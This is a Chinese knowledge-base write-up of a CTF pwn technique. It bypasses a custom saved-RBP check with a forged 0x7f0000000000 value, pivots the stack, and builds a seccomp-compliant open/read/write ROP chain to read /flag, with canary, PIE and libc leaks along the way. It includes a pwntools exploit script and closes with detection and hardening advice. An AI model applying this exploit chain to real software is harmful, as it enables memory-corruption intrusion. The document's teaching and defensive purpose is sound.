---
id: binary-pwn-stack-fake-rbp-check-seccomp-orw
title: seccomp ORW 下的自定义 RBP 栈帧校验绕过与栈迁移
type: scenario
domain: binary
path: binary/pwn/stack
technique: fake-rbp-check-bypass-seccomp-orw
tags:
- pwn
- stack-overflow
- stack-pivot
- rbp-check
- seccomp
- orw
- canary
- libc-leak
- rop
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V93
  verified_at: '2026-11-05T19:43:00+08:00'
  notes: 已对照原文全文（无图片）核对：_cyg_profile_func_exit检查vars0+8的0x7f前缀与8字节对齐、0x7f0000000000伪造RBP、12D5处push rbp/mov rbp,rsp/...pop rbp;ret重植gadget、preview越界泄露canary/PIE、stdin与__ctype_b_loc泄露libc、seccomp下open/read/write ORW完整exp均与原文一致；未复跑exp，偏移为原题示例
url: /docs/binary/pwn/stack/binary-pwn-stack-fake-rbp-check-seccomp-orw/
draft: false
kb_aliases:
- 自定义 RBP 校验绕过
- 0x7f0000000000 伪造 RBP
- push rbp gadget 绕过影子栈
- seccomp ORW ROP
- 栈帧检查绕过
- 栈迁移 ORW
---

## 一句话结论

当程序在函数返回前用自定义“影子栈”检查保存的 RBP（非零、`0x7f` 前缀、8 字节对齐）时，可以在栈溢出中用 `0x7f0000000000` 伪造保存 RBP 通过检查，并用 `push rbp; ...; pop rbp; ret` 类 gadget 在栈上重新留下合法 RBP；再配合 canary/PIE/libc 泄露与 `pop rax/rdi/rsi/rbx; mov rdx,rbx; syscall` 链，在 seccomp 只允许 `open/read/write` 的环境下完成 ORW 读取 flag。

## 原理

- 程序把每个业务函数用 `_cyg_profile_func_enter`/`_cyg_profile_func_exit` 包裹（名字伪装成性能分析库函数，实际是自定义实现）。`_cyg_profile_func_exit` 读取调用者的保存 RBP（`vars0`）：
  - `vars0 == 0` 直接退出；
  - `sub_1278(vars0 + 8)` 检查 `(a1 & 0xFF0000000000) == 0x7F0000000000` 且 `a1 & 7 == 0`，失败则 `sub_1249()` 退出。
  这相当于一个用户态“影子栈/帧指针完整性”检查：要求保存的 RBP 落在 `0x7f...` 区域并 8 字节对齐。
- 栈溢出覆盖保存 RBP 时，直接填普通地址（BSS、PIE 代码段）会失败；填 `0x7f0000000000`（或任意满足 `0x7f` 前缀且对齐的地址）即可通过 `vars0+8` 的掩码与对齐检查。
- 但 `ret` 进入 ROP 链后，后续被包裹的函数在退出时还会再次检查当时的 RBP。需要一个“重植 RBP”的 gadget，例如：
  `push rbp; mov rbp, rsp; mov [rbp-8], rdi; mov [rbp-10h], rsi; nop; pop rbp; ret`。
  它把受控的 `rdi/rsi` 写到栈上、弹回一个合法 RBP 再返回，使后续函数的 `_cyg_profile_func_exit` 仍能通过检查；原文把这类片段与 `leave; ret`/`pop rbp` 配合完成栈迁移。
- 泄露链：`draft` 允许 `size <= 0xE8` 的写入和 `size2 <= 0x30` 的 preview；`leak(s, size2)` 从 24 字节的 `s` 起按 8 字节循环读取，超出 `s` 后就能打印栈上的 canary、保存 RBP、返回地址，得到 canary 与 PIE 基址。
- libc 泄露：程序有一个根据 qword 字节选择分支的 `sub_1320`（要求字节 5 > 0x6f、字节 6/7 为 0），满足时走全局 `buf_` 分支，可打印 BSS 中的 `stdin` 指针；另一条路线是用 `__ctype_b_loc@plt` 的“magic gadget”——该函数返回一个 libc 内部指针，`ret` 后接 `mov rdi, rax; call puts@plt`，可直接把 libc 地址打印出来。
- seccomp 只允许 `open/read/write`（无 `execve`），因此最终链是 ORW：`open("/flag", O_RDONLY)` → `read(fd, bss, 0x30)` → `write(1, bss, 0x30)`。ROP 使用 `pop rax; pop rdi; pop rsi; pop rbx; mov rdx, rbx; syscall` 等 gadget；`rsp` gadget/`leave; ret` 把栈切到 BSS 上预置的链。
- 关键点：RBP 检查不是硬件影子栈，只是用户态可被覆盖的栈帧值检查；只要攻击者能控制保存 RBP 并找到重植 gadget，就能绕过。检查越“严格”（要求 0x7f 地址），反而给攻击者一个明确的伪造目标。

## 触发条件

- 存在栈溢出且能覆盖保存 RBP/返回地址，目标函数被自定义 `_cyg_profile_func_exit` 包裹。
- 程序开启 Canary，但有可用的栈越界读/泄露原语；未开启 PIE 或可泄露 PIE；libc 地址可泄露。
- seccomp 允许 `open/read/write`（或等价文件读取系统调用），禁止 `execve`；目标文件路径（如 `/flag`）可读。
- 能找到 `pop rax/rdi/rsi/rbx`、`mov rdx,rbx`、`syscall`、`rsp`/`leave;ret` 等 gadget，以及 `push rbp; ...; pop rbp; ret` 类重植 gadget。

## 利用步骤

1. 反编译 `_cyg_profile_func_exit`/`sub_1278`，确认 RBP 检查的掩码、前缀（0x7F）、对齐要求与失败路径；确认哪些函数被包裹。
2. 用 `draft` 的 preview 越界读泄露 canary、保存 RBP、返回地址；由返回地址计算 PIE 基址，并记录 canary。
3. 构造第一次溢出：`0x18` 字节填充 + canary + 满足检查的 `0x7f0000000000` + 重植 gadget/返回地址；按需用 `leave; ret` 或 `pop rbp` 把栈迁移到 BSS 预置区，同时保证每个被包裹函数退出时 RBP 仍合法。
4. 泄露 libc：通过 BSS 中的 `stdin` 指针或 `__ctype_b_loc` magic gadget 打印 libc 地址，计算 libc 基址与各 gadget 偏移。
5. 构造 ORW ROP：`open("/flag", 0)` → `read(fd, bss, 0x30)` → `write(1, bss, 0x30)`；把 `/flag\0` 放在 BSS 可控区，用 `mov rdx,rbx` 设置长度，`syscall` 触发。
6. 触发链并读取输出；若在某次 `_cyg_profile_func_exit` 崩溃，检查该点的 RBP 是否被 ROP gadget 改坏，补一个重植 RBP 的 gadget。

## PoC

以下为原文 exploit 的关键结构（偏移/地址为原题示例，必须按目标重算；未在本机复跑）：

```python
from pwn import *
elf = ELF("./game"); libc = ELF("./libc.so.6")

# 1) 泄露 canary / PIE（preview 越界读）
# ... draft(size=0x60) -> leak 0x30 bytes ...
canary = u64(io.recv(8))
pie = u64(io.recv(6).ljust(8, b"\0")) - 0x21bd
bss = elf.bss() + pie
vuln = pie + 0x1F8D

# 2) 溢出：填充 + canary + 通过 0x7f 检查的保存 RBP
pay  = b"a" * 0x18 + flat(canary, 0x7f0000000000)
# 3) 重植 RBP / 栈迁移 gadget + 泄露 stdin 指针
pay += flat(pie + 0x1140, pie + 0x1A24, 0, vuln)
pay  = pay.ljust(0xE8, b"\0")
# ... 发送并触发 ...

# 4) libc 基址（stdin 指针或 __ctype_b_loc magic gadget）
libc.address = leaked_stdin - 0x1b28c0

# 5) seccomp 下的 ORW ROP
rax          = libc.address + 0x0dd237
rdi          = libc.address + 0x10f78b
rsi          = libc.address + 0x110a7d
rbx          = libc.address + 0x0586e4
mov_rdx_rbx  = libc.address + 0x0b0153
syscall      = libc.address + 0x098fb6
rsp          = libc.address + 0x03c068

pay  = b"a" * 0x18 + flat(canary, 0x7f0000000000)
pay += flat(rax, 0, rsi, bss, rbx, 0x200, mov_rdx_rbx,
            0, 0, 0, syscall, rsp, bss + 8)
pay  = pay.ljust(0xE8, b"\0")
# ... 发送，随后在 BSS 上布置 ORW 链 ...

flag_addr, store_addr = bss, bss + 0x400
orw  = flat(rax, 2, rdi, flag_addr, rsi, 0, syscall)              # open
orw += flat(rax, 0, rdi, 3, rsi, store_addr, rbx, 0x30,
            mov_rdx_rbx, 0, 0, 0, syscall)                        # read
orw += flat(rax, 1, rdi, 1, rsi, store_addr, syscall)             # write
io.send(b"/flag\0\0\0" + orw)
io.interactive()
```

```text
关键检查（原文）：
  vars0 != 0
  (vars0 + 8) & 0xFF0000000000 == 0x7F0000000000
  (vars0 + 8) & 7 == 0
重植 gadget：
  push rbp; mov rbp, rsp; mov [rbp-8], rdi; mov [rbp-10h], rsi;
  nop; pop rbp; ret
```

## 变体与关联

- 变体：检查若只要求非零/对齐而不要求 `0x7f` 前缀，可直接用 BSS 或堆地址；若检查读取的是另一层栈帧，需要调整 gadget 让目标帧的 RBP 合法。
- 变体：libc 泄露可用 GOT、`environ`、`stdin` 指针、`__ctype_b_loc` 等返回 libc 指针的函数；不同 libc 版本偏移不同。
- 变体：seccomp 只放行 `openat` 时把 `open` 换成 `openat(AT_FDCWD, ...)`；只放行 `read/write` 时需先通过其他方式获得 fd。
- 关联：[[binary-pwn-stack-pivot-leave-ret-bss]]（leave;ret 栈迁移）、[[binary-pwn-stack-ret2syscall-32bit]]（syscall ROP 基础）、[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]（seccomp ORW 的 shellcode 版本）、[[ctf-pwn-hexfloat-strtoull-parser-differential]]（同一题中进入溢出前的数值校验绕过）。
- 边界：RBP 检查只在本函数/被包裹函数退出时生效，检查点越多越需要重植；`0x7f0000000000` 可能不对应可访问内存，但检查只做位掩码/对齐，不会解引用，所以可作哨兵；若检查改为读取 `[rbp]`/`[rbp+8]` 内容则会崩溃。栈迁移目标（BSS）必须可写且长度足够；Canary/PIE/ASLR 仍需先泄露。

## 检测与防御

- 检测：代码审计搜索自定义 `_cyg_profile_func_enter/exit`、保存 RBP 的位掩码/前缀/对齐检查、以及 `0x7F0000000000` 这类常量；崩溃现场 RBP 为 `0x7f0000000000` 或异常对齐值。
- 修复：不要把用户态栈帧检查当安全边界；开启 Canary、PIE、Full RELRO、CFG/CET；对关键函数使用硬件影子栈（CET SHSTK）或编译器栈保护；seccomp 进一步限制 `open/read/write` 的目标（openat2 + RESOLVE_*、Landlock），不要只依赖禁用 `execve`。
- 加固：栈迁移检测（RSP 指向 BSS/堆）、ROP gadget 监控、libc 地址泄露面收敛（少打印指针、`stdin` 等全局指针不放可读区）；对 CTF 题而言，检查点应读取真正不可控的硬件状态，而不是可被溢出覆盖的保存 RBP。
